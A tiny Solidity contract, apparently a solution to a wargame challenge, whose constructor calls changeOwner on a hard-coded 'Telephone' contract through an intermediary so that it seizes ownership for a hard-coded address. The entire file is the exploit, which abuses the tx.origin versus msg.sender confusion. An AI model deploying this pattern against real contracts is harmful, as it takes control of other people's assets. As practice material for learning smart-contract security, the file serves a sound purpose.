// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}
contract Telephone {


  constructor() public {
    ITelephone(0x12614d20a27Dd77b87e03c728DDC1e9495E3c5D4).changeOwner(0xcafea1A2c9F4Af0Aaf1d5C4913cb8BA4bf0F9842);
  }

}